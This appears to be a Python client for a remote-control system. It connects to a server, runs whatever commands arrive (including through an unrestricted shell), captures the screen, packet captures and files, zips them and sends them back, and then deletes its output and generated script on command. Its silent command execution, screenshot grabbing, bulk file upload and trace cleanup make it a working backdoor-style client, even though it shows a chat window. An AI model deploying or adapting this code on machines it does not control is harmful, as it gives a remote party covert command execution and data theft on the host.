from Sockets import Socket
import subprocess
import os
import time
import datetime
import logging as log
import zipfile
import shutil


_exec = "python3 scripts/pClient.py"
proc_id = []

clientSocket = Socket()
client = clientSocket.sock
host, port = clientSocket.clientCommands()

time.sleep(0.1)
path_to_dir = "out_client"

if not os.path.exists(path_to_dir):
    os.makedirs(path_to_dir)


date_format = datetime.datetime.fromtimestamp(
    time.time()).strftime('%Y-%m-%d_%H-%M-%S')
ts_format = datetime.datetime.fromtimestamp(
    time.time()).strftime('%Y%m%d_%H%M%S')

logname = "process_" + date_format + ".log"
log.basicConfig(filename=os.path.join(path_to_dir, logname), level=log.INFO)
log.info(" {} - Initialised loggin to file.".format(ts_format))


def sendOverSock(message="", encoding=True):
    if encoding:
        client.sendall(message.encode('utf-8'))
    else:
        client.sendall(message)


def recvOverSock(buffsize=1024, decoding=True):
    if decoding:
        recv_data = client.recv(buffsize).decode('utf-8')
    else:
        recv_data = client.recv(buffsize)
    return recv_data


def silentMode():
    log.info(" {} - Listening to silent commands started.".format(ts_format))

    while True:
        __mode = recvOverSock(8192)

        if __mode == "static_mode":
            while True:
                __message = recvOverSock(8192)
                if __message == "end":
                    break
                log.info(
                    " {} - Received {} command '{}'".format(ts_format, __mode, __message))

                try:
                    command_splice = __message.split(" ")

                    process_stream = subprocess.Popen(
                        command_splice, stdout=subprocess.PIPE).stdout
                    proc_out = process_stream.read().decode('utf-8')
                    if proc_out:
                        sendOverSock(proc_out)

                    log.info(
                        " {} - Executed {} command '{}'".format(ts_format, __mode, __message))

                except FileNotFoundError as err:
                    err_msg = "FileNotFoundError: " + str(err)
                    sendOverSock(err_msg)

        if __mode == "dyn_out_to_file":
            while True:
                __message = recvOverSock(8192)
                if __message == "end":
                    break
                log.info(
                    " {} - Received {} command '{}'".format(ts_format, __mode, __message))

                try:
                    command_splice = __message.split(" ")
                    t_out = int(command_splice[-1])
                    del command_splice[-1]
                    if command_splice[0] == "sudo":
                        fname = command_splice[0] + \
                            "_" + command_splice[1] + ".txt"
                    else:
                        fname = command_splice[0] + ".txt"

                    with open(os.path.join(path_to_dir, fname), "w+") as output:
                        try:
                            proc = subprocess.Popen(
                                command_splice, stdout=output)
                            proc_pid = proc.pid
                            proc.wait(timeout=t_out)
                        except subprocess.TimeoutExpired:
                            if command_splice[1] == 'tcpdump':
                                subprocess.call(['sudo', 'pkill', 'tcpdump'])
                            else:
                                subprocess.call(
                                    ['sudo', 'kill', '-9', str(proc_pid)])

                    time.sleep(2)
                    with open(os.path.join(path_to_dir, fname), "rb") as output:
                        freader = output.read()
                    client.send(str(len(freader)).encode('utf-8'))
                    time.sleep(1)
                    client.sendall(freader)

                    log.info(
                        " {} - Executed {} command '{}'".format(ts_format, __mode, __message))

                except FileNotFoundError as err:
                    err_msg = "FileNotFoundError: " + str(err)
                    sendOverSock(err_msg)

        if __mode == "stdlone_cmd":
            while True:
                __message = recvOverSock(8192)
                if __message == "end":
                    break
                log.info(
                    " {} - Received {} command '{}'".format(ts_format, __mode, __message))

                try:
                    command_splice = __message

                    proc = subprocess.Popen(command_splice, stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, shell=True)
                    reader = proc.stdout.read().decode('utf-8')
                    if reader:
                        sendOverSock(reader)
                    else:
                        sendOverSock("No output")
                    log.info(
                        " {} - Executed {} command '{}'".format(ts_format, __mode, __message))

                except FileNotFoundError as err:
                    err_msg = "FileNotFoundError: " + str(err)
                    sendOverSock(err_msg)

        if __mode == "go_to_main":
            return

    return


def captureMode():
    log.info(" {} - Listening to capture commands started.".format(ts_format))
    while True:
        __message = recvOverSock(8192)
        log.info(" {} - Received capture command '{}'".format(ts_format, __message))

        if __message == "go_to_main":
            return

        if __message == "fetch_cap_mode":
            capture_screen()
            for eachProc in proc_id:
                subprocess.call(['kill', '-9', str(eachProc)])
            proc_id.clear()
            return

        __command = ['xterm', '-hold', '-e']
        for somecmd in __message.split(' '):
            __command.append(somecmd)

        proc = subprocess.Popen(__command)
        proc_id.append(proc.pid)
        # TODO: print(proc_id)

        log.info(" {} - Executed capture command '{}'".format(ts_format, __message))
    return


def capture_screen():
    log.info(" {} - Screenshot grab initiated.".format(ts_format))
    with open(os.path.join('scripts', "grab_screen.py"), 'w') as outFile:
        code = [
            """import pyscreenshot as pyscrn\nimport os\nimport time\nimport datetime\n""",
            """ts_format = datetime.datetime.fromtimestamp(time.time()).strftime('%Y%m%d_%H%M%S')\n""",
            """path_to_dir='out_client'\n""",
            """if not os.path.exists(path_to_dir):\n    os.makedirs(path_to_dir)\n""",
            """pyscrn.grab_to_file(os.path.join(path_to_dir,ts_format+'_out_cap_mode.png'))"""
        ]
        for lines in code:
            outFile.write(lines)
    subprocess.call("python3 scripts/grab_screen.py", shell=True)
    return


def sendSpecific(filename, __message):
    if "." in filename:
        with open(os.path.join(path_to_dir, filename), "rb") as output:
            freader = output.read()
        client.send(str(len(freader)).encode('utf-8'))
        time.sleep(1)
        client.sendall(freader)

        log.info(
            " {} - Sent file {} on command '{}'".format(ts_format, filename, __message))

    if "." not in filename:
        flush_as_zip("out_" + filename +
                     ".zip", os.path.join(path_to_dir, filename))
        with open(os.path.join(path_to_dir, "out_" + filename + ".zip"), "rb") as readZip:
            data_in_bytes = readZip.read()
        client.send(str(len(data_in_bytes)).encode('utf-8'))
        time.sleep(1)
        client.sendall(data_in_bytes)

        log.info(
            " {} - Sent file {} on command '{}'".format(ts_format, filename, __message))


def fetchAllFiles():
    log.info(" {} - Fetching data process started.".format(ts_format))

    while True:
        data = recvOverSock(1024)

        if data == "go_to_main":
            break

        if data == "fetch_specific":
            proc = subprocess.Popen("cd out_client ; ls -l", stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE, shell=True)
            get_output = proc.stdout.read().decode("utf-8")
            if get_output:
                sendOverSock(get_output)

            while True:
                req_file = recvOverSock(1024)
                if req_file == 'end':
                    break

                if not os.path.exists(path_to_dir + "/" + req_file):
                    client.send("-1".encode('utf-8'))
                    continue
                    # TODO: kinda fixed looping

                if os.path.exists(path_to_dir + "/" + req_file):
                    client.send("1".encode('utf-8'))
                    sendSpecific(req_file, data)

        if data == "fetch_all":
            flush_as_zip("out_to.zip", path_to_dir)
            with open(os.path.join(path_to_dir, "out_to.zip"), "rb") as readZip:
                data_in_bytes = readZip.read()
            client.send(str(len(data_in_bytes)).encode('utf-8'))
            time.sleep(1)
            client.sendall(data_in_bytes)
    return


def flush_as_zip(fname, drtry):
    with zipfile.ZipFile(os.path.join(path_to_dir, fname), 'w', zipfile.ZIP_DEFLATED) as out_zip:
        for root, dirs, files in os.walk(drtry):
            for eachDir in dirs:
                out_zip.write(os.path.join(root, eachDir))
            for eachFile in files:
                if eachFile != fname and eachFile != drtry + ".zip":
                    out_zip.write(os.path.join(root, eachFile))
    return


def cleanUp():

    if os.path.exists(path_to_dir):
        shutil.rmtree(path_to_dir)

    if os.path.exists("scripts/grab_screen.py"):
        os.remove("scripts/grab_screen.py")

    log.info(" {} - CleanUp Completed.".format(ts_format))
    return


def main():

    if client:
        print("\nWaiting for response from server.")
        print(recvOverSock(1024))
        log.info(" {} - Connection Established between server.".format(ts_format))

    print("\n\nInitialising chat with server on new window.\nPlease do not close this window.\n")
    time.sleep(3)
    os.system("gnome-terminal -e 'bash -c \"" + _exec + "; exec bash\"'")
    log.info(" {} - Chat-init successfull.".format(ts_format))

    while True:
        data = recvOverSock(8192, False)

        if data.decode('utf-8') == 'silent_mode':
            log.info(" {} - Initialised silent mode.".format(ts_format))
            silentMode()

        if data.decode('utf-8') == 'capture_mode':
            log.info(" {} - Initialised capture mode.".format(ts_format))
            captureMode()

        if data.decode('utf-8') == 'ready_to_fetch':
            log.info(" {} - Initialised Fetching mode.".format(ts_format))
            fetchAllFiles()

        if data.decode('utf-8') == 'init_clean_mode':
            log.info(" {} - Initialised cleanUp mode.".format(ts_format))
            cleanUp()
            log.info(" {} - Exit called.".format(ts_format))
            closeConn()
            exit(0)

    closeConn()
# end of main


def closeConn():
    clientSocket.shutdown()


if __name__ == "__main__":
    main()
